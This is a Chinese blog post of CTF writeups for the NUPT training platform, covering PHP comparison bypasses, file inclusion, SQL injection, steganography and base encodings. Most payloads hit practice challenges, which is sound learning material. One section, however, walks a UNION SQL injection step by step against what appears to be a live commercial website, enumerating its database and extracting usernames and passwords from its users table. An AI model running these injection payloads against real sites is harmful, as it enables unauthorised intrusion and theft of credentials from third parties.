---
layout: post
title: 南邮平台Writeup
tags:
- Writeup
categories: Writeup
description: 南邮攻防平台
---

>[南京邮电大学网络攻防训练平台](http://ctf.nuptsast.com/challenges#)是一个长时间提供CTF赛题的一个平台，有积分，有排榜，而且大部分题目比较基础，对新手有很大的帮助
<!-- more -->

先来一张图片证明
![image](https://github.com/Snowwood/Snowwood.github.io/blob/master/assets/img/nctf.jpg?raw=true)

#WEB

###签到题
查看源码得到flag

###md5 collision
这题考察的PHP的 `==`判断的一个黑魔法，当 `==` 两端的值是以`0e`开头的，后面全跟的数字的字符串时，等式成立
```php
$a = '0e830400451993494058024219903391';
$b = '0e545993274517709034328855841020';
if($a == $b) {
    echo "good!";
}
```
```php
good!
```
而题目中给的字符串是`QNKCDZO`，md5加密之后得到`0e830400451993494058024219903391`,所以再找一个md5加密后也是`0e`开头的字符串，比如`s878926199a`，就能拿到flag

###签到2
口令是`zhimakaimen`有11位长度，但是输入框最长只有10位长度，所以右键输入框查看元素，将`maxlength`的值修改为`12`，输入口令，得到Flag

###这题不是WEB
下载图片，用记事本打开，在最后得到Flag

###层层递进
查看源代码，在最后有一个`SO.html`，点开，发现`S0.html`，点开发现`SO.htm`，再次点开`S0.htm`，最后发现`404.html`，点开发现一段奇怪的注释，仔细看没局注释隐藏了Flag的一个字符，依次读出即可
>**注意：**虽然前几个页面名称都挺像`SO`，但实际并不相同，所以不是一个循环链接

###AAencode
直接打开[解密网站](http://utf-8.jp/public/aaencode.html)，`eval`即可

###单身二十年
点开题目所给链接，发现什么都没有，打开火狐工具开发者工具包，在网络那栏里面发现有两个请求，一个是当前页面`no_key_is_here_forever.php`，另一个是`search_key.php`，看名称就能看出端倪，点开`search_key.php`右边响应一栏得到Flag

###你从哪里来
```
are you from google?
```
第一个就想到了改`Reference`头，先用`Burpsuite`改抓包，然后将Reference改成`https://www.google.co.jp/`，得到Flag

###php decode
把代码在本地PHP环境运行一下，或者在[网页](http://www.shucunwang.com/RunCode/php/)上在线运行，网页上运行是不允许有`eval`函数的，所以将`eval`函数转为`echo`，输出Flag

###文件包含
此题给了一个乌云文件包含总结`http://drops.wooyun.org/tips/3827`
这题用的是php流filter `?file=php://filter/convert.base64-encode/resource=index.php`
得到base64编码，解码就能得到Flag

###单身一百年也没用
这题直接用上面单身二十年那题方法，在另一个页面的返回头里面有Flag

###Download~!
查看源码，网页中给的两个URL都是这种形式的
````
download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=
download.php?url=YnV4aWFuZ3poYW5nZGEubXAz
```
所以我们将download.php也base64加密得到
download.php?url=ZG93bmxvYWQucGhw
访问得到
```php
<?php
error_reporting(0);
include("hereiskey.php");
$url=base64_decode($_GET[url]);
if( $url=="hereiskey.php" || $url=="buxiangzhangda.mp3" || $url=="xingxingdiandeng.mp3" || $url=="download.php"){
	$file_size = filesize($url);
	header ( "Pragma: public" );
	header ( "Cache-Control: must-revalidate, post-check=0, pre-check=0" );
	header ( "Cache-Control: private", false );
	header ( "Content-Transfer-Encoding: binary" );
	header ( "Content-Type:audio/mpeg MP3");
	header ( "Content-Length: " . $file_size);
	header ( "Content-Disposition: attachment; filename=".$url);
	echo(file_get_contents($url));
	exit;
}
else {
	echo "Access Forbidden!";
}
?>
```
其中`include("hereiskey.php");`看一下估计就是我们想要的了，直接访问返回空页面
用`download.php?url=aGVyZWlza2V5LnBocA==`访问得到Flag

###COOKIE
看题目估计是要改COOKIE值，打开链接发现空页面，直接看COOKIE，请求头里`Login=0`，直接抓包该COOKIE为`Login=1`得到Flag

###MYSQL
```
Do you know robots.txt？
```
Robots.txt是网站定义的哪些页面可以被爬虫，哪些不可以，一般在根目录下
这题是在当前目录下，直接在URL中访问robots.txt
```php
TIP:sql.php

<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```
知道是在sql.php页面进行简单SQL注入，需要传入参数 id，id 的值等于 1024 时输出`no! try again`，id 等于其他值是输出对应参数的值
试了几个id 的值，发现并没有什么收获，想起上面再进行比较之前有一句`$id = intval($_GET[id]);`，将id 进行整数化，所以如果将id 传入一个小数试试，`id=1024.1`,得到Flag
其实细读给出的代码，按照CTF的习惯，这题就是怎么输入`id != 1024`，但是` intval(id) == 1024`

###sql injection 3
试了一下发现是宽字节注入，宽字节注入是因为url进行gbk编码的时候双字节的%df覆盖掉了后面的%27
```
http://115.28.150.176/sqli/index.php?id=?' or 1=1 order by 1#
执行的sql语句：SELECT id,title FROM news WHERE id='運' or 1=1 order by 2#'
id: 2 title: gbk_sql_injectionid: 1 title: just_a_test
```
order by 3 出错，所以值 2
```
http://115.28.150.176/sqli/index.php?id=?' or 1=1 order by 3#
ErrorUnknown column '3' in 'order clause'
```
查询数据库名称得到 `sqli1 `
```
http://115.28.150.176/sqli/index.php?id=?' union select database(),2#
执行的sql语句：SELECT id,title FROM news WHERE id='運' union select database(),2#'
id: sqli1 title: 2
```
查询表名得到 `flag ，news`，直接看 flag 表啦
```
http://115.28.150.176/sqli/index.php?id=?' 
union select group_concat(table_name),2 from information_schema.tables where table_schema=0x73716C6931#
执行的sql语句：SELECT id,title FROM news WHERE id='運' union select group_concat(table_name),2 from information_schema.tables where table_schema=0x73716C6931#'
id: flag,news title: 2
```
查询列名得到 `fl4g`
```
SELECT id,title FROM news WHERE id='運' 
union select group_concat(column_name),2 from information_schema.columns where table_name=0x666C6167#'
id: fl4g title: 2
```
直接查询 fl4g 字段的值
```
SELECT id,title FROM news WHERE id='運' union select fl4g,2 from flag#'
id: nctf{gbk_3sqli} title: 2
```

###/x00
题目所给代码
```php
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
```
需要参数 nctf 有值
`@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE`不能成立
且`strpos ($_GET['nctf'], '#biubiubiu') !== FALSE`成立就会给 flag

第一个不等式中 ereg 函数，当传入参数为数组 nctf[] 时，`NULL != FALSE` ，构造成功跳过第一个不等式
第二个不等式中 strpos 函数传入参数 数组之后 `NULL != FLASE`会返回flag
最后构造的参数为 nctf[]=123

###bypass again
题目所给代码
```php
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) === md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
```
php中的 md5 函数遇到参数是数组时，返回 NULL ，所以传入 a[] = 1 & b[] = 2 得到NULL === NULL，返回Flag

###变量覆盖
关键代码
```
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
    extract($_POST);
    if ($pass == $thepassword_123) {
        echo $theflag;
   } 
} ?>
```
直接抓包 最后post参数改为
pass=1&thepassword_123=1

###PHP是世界上最好的语言
关键代码
```
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```
URL 二次加密绕过
id = %%36%38ackerDJ

###伪装者
改 X-Forwarded-For 为127.0.0.1

###Header
flag在返回包头里

###上传绕过
随便上传一个文件说要php结尾的文件
上传php文件告诉只能上传jpg,gif,png后缀的文件


###SQL注入1
关键代码
```php
$user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
```
 绕过代码 `admin''') or 1=1 #--`
select user from ctf where (user='"admin''') or 1=1 #--"') and (pw='".$pass."')" 

###pass check
核心源码
```php
<?php
$pass=@$_POST['pass'];
$pass1=*;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo "flag:nctf{*}";
}else{
echo "the pass is wrong!";
}
}else{
echo "please input pass!";
}
?>
```
抓包改pass的值 等于 pass[] = 1
strcmp函数为NULL，if 值为真

###起名字真难
源码
```
<?php
function noother_says_correct($number)
{
$one = ord('1');
$nine = ord('9');
for ($i = 0; $i < strlen($number); $i++)
{
$digit = ord($number{$i});
if ( ($digit >= $one) && ($digit <= $nine) )
{
return false;
}
}
return $number == '54975581388';
}
$flag='*';
if(noother_says_correct($_GET['key']))
echo $flag;
else
echo 'access denied';
?>
```
如果number的值为54975581388输出flag，但是number中不能有数字。所以用十六进制 0xccccccccc

###密码重置
随便填个值抓包，默认账号是 `ctfuser`，POST 的值是`user=ctfuser&newpass=admin&vcode=1234`
发现 post 的 URL是 `/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D`
经过先 URLdecode 解码再 base64decode 得到 `/web13/index.php?user1=ctfuser` 与 POST的值相同
基本可以明确 URL中user1 变量的值和POST的值确定了修改的账户
将这两个值都改成admin，url1需要先base64encode再URLencode，FLag在返回包中

###php 反序列化
这个 [博客](http://www.hazzel.cn/archives/19.html) 写的不错

###sql injection 4
关键代码
```php
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
	die('Invalid password!');
}

echo $flag;
```
在单引号内的mysql注入，核心就是逃脱单引号，要么生成一个(htmlentities了单引号，不太可能)，要么...干掉一个。payload：`?username=admin\&password=%20or%201%23`

###综合题
一看知道是 jsfuck加密，[解密](http://www.jsfuck.com/)得到`1bc29b36f623ba82aaf6724fd3b16718.php`
提示 `哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里`,查看http包头，提示`tip: history of bash`
思考良久不知道，后经提示访问`.bash_history`，提示`zip -r flagbak.zip ./*`，访问flagbak.zip
下载解压得到FLag

###SQL注入2
关键代码
```php
<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```
只要让密码md5之后和user里union的值相等就行，直接POST `user=' union select 'c4ca4238a0b923820dcc509a6f75849b'#&pass=1`
构成select pw from ctf where user=' ' union select 'c4ca4238a0b923820dcc509a6f75849b'#&pass=1'"
此时 user=' union select 'c4ca4238a0b923820dcc509a6f75849b'#&pass=1，pass=1，query[pw]=c4ca4238a0b923820dcc509a6f75849b

###综合题2
还是看别人 [Blog](http://www.hazzel.cn/archives/10.html)

###注入实战1
mysql注入
判断是否有注入
http://www.backstagecommerce.ca/services.php?id=4 and 1=1		返回正确
http://www.backstagecommerce.ca/services.php?id=4 and 1=2		返回错误		有注入

确定union查询字段数
http://www.backstagecommerce.ca/services.php?id=4 order by 19		返回正确
http://www.backstagecommerce.ca/services.php?id=4 order by 20		返回错误			确定字段数为19

确定返回字段
http://www.backstagecommerce.ca/services.php?id=4 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
返回3,6,7,8,9,10,11,12,13

选择上面的其中的一个返回字段 12 替换为dabase()，查询数据库名称
http://www.backstagecommerce.ca/services.php?id=4 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,database(),13,14,15,16,17,18,19			返回 db1052699_bsc

将数据库名称转为十六进制，查询表名
http://www.backstagecommerce.ca/services.php?id=4 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,group_concat(table_name),13,14,15,16,17,18,19 from information_schema.tables where table_schema=0x6462313035323639395F627363	
返回了很多表名 CROC,FHI,backstagecommerce,brands,career,comments,contact,divanetwork,gama,hairforensic,hairtreats,index_page,kenchii,kerastraight,news_media,sales,sales_volume,support,team,unitedhairstylist,users,webpages

选择users表名，不要问我为什么，你一般拿站一般要什么内容嘛，除了装X，基本上都是冲着裤子，题目也说了是要管理员密码
http://www.backstagecommerce.ca/services.php
?id=4 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,group_concat(column_name),13,14,15,16,17,18,19 from information_schema.columns where table_name=0x7573657273
返回三列 id,username,password

查询字段名
http://www.backstagecommerce.ca/services.php
?id=4 and 1=2 UNION SELECT 1,2,3,4,5,6,7,id,9,10,11,username,password,14,15,16,17,18,19 from users

###密码重置2
让重置管理员密码
>TIPS:
1.管理员邮箱观察一下就可以找到
2.linux下一般使用vi编辑器，并且异常退出会留下备份文件
3.弱类型bypass

源码得到管理员邮箱 admin@nuptzj.cn，action="submit.php"，访问.submit.php.swp备份文件得到信息
```php
........这一行是省略的代??........

/*
如果登录邮箱地址不是管理员则 die()
数据库结??

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数?? `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可??***', '***不可??***', 0);
*/


........这一行是省略的代??........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```
看出需要email=admin@nuptzj.cn&token=00000000000，提交的到Flag

#隐写术

###女神
下载图片用记事本打开在最后得到 Flag

###图种
将图片另存为然后将后缀名改为zip，打开得到另一张图片，打开图片等最后一句话然后记下首字母

###丘比龙De女神
gif改成zip，里面文件加密了，无法打开，提示出错。
最后有nvshen.jpg
搜索6E767368656E
在d8e2处有一个nvshen.jpg
在nvshen.jpg上面有个love单词，怀疑是zip文件头，打开一个zip文件看一下，基本上里面文件前面一行就是文件头pk

将6C6F7665至文件结尾复制出来，保存为zip文件
将文件头6C6F766514000100替换成504B030414000000
这样就可以打开zip文件
密码猜测就是love

#密码学

###easy!
bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9直接base64解密

###KeyBoard
ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm
键盘密码，看电脑键盘上画出的图形

###base64全家桶
```python
>>> import base64
>>> base64.b64decode('R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVkzREVOUlJHNFpUTU5KVEdFWlRNTjJF')
'GZCTMMZXGQ3DMN2CGYZDMMJXGM3DKMZWGM2DKRRWGI3DCNZTGY2TGMZTGI2UMNRRGZCTMNBVIY3DENRRG4ZTMNJTGEZTMN2E'
>>> base64.b32decode('GZCTMMZXGQ3DMN2CGYZDMMJXGM3DKMZWGM2DKRRWGI3DCNZTGY2TGMZTGI2UMNRRGZCTMNBVIY3DENRRG4ZTMNJTGEZTMN2E')
'6E6374667B6261736536345F6261736533325F616E645F6261736531367D'
>>> base64.b16decode('6E6374667B6261736536345F6261736533325F616E645F6261736531367D')
'nctf{base64_base32_and_base16}'
```

###n次base64
```python
# coding:utf-8
import base64

f = open("base64_string.txt", "r")
# f1 = open("str.txt","w")
str = ""
if f:
    while True:
        line = f.readline()
        if line:
            line = line[:-1]
            str += line
        else:
            break

    str += '='
    # if f1:
    #    f1.write(str)
    # print str
    # print str.find('nctf')
    while str.find('nctf') == -1:
        str += '='
        try:
            tmp = base64.b64decode(str)
            if tmp.decode('utf-8') == tmp:
                str = tmp
        except Exception,e:
            print Exception,":",e
            try:
                tmp = base64.b32decode(str)
                if tmp.decode('UTF - 8') == tmp:
                    str = tmp
            except Exception,e:
                print Exception,":",e
                tmp = base64.b16decode(str)
                if tmp.decode('UTF-8') == tmp:
                    str = tmp

    print str

else:
    print "open file error"

```



